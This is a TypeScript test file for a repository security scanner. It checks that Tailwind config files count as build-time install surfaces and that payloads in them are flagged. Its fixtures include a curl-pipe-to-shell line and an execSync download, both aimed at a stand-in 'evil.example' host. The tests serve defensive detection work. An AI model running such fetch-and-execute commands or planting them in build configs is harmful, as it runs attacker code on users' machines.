import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Tailwind config is an install surface", () => {
  // Tailwind looks up tailwind.config.<ext> and imports it as code
  // (through jiti) on every CSS build — build-time execution in the
  // same sense the webpack config and the Makefiles already classify
  // for. The config's spellings are all code: Tailwind's docs cover
  // the JavaScript, ESM and TypeScript forms and no data-format
  // spelling of this name exists. It keeps the source surface it
  // already had; the name alone decides, wherever the project root
  // sits.
  for (const path of [
    "tailwind.config.js",
    "tailwind.config.cjs",
    "tailwind.config.mjs",
    "tailwind.config.ts",
    "tailwind.config.cts",
    "apps/web/tailwind.config.mts",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("tailwind.config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["tailwind.config.js:unsafe-execution:high"]);
});

test("an install-time download inside a Tailwind config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on
  // it but the same bytes recorded no download and left no gap: a scan
  // could read clean over a fetch Tailwind would have run while
  // building the CSS.
  const inspection = inspected(
    "tailwind.config.js",
    "const { execSync } = require('node:child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nmodule.exports = {};\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Tailwind config keeps no finding", () => {
  const inspection = inspected(
    "tailwind.config.js",
    "module.exports = {\n  content: ['./src/**/*.{html,js}'],\n  theme: { extend: {} },\n  plugins: [],\n};\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
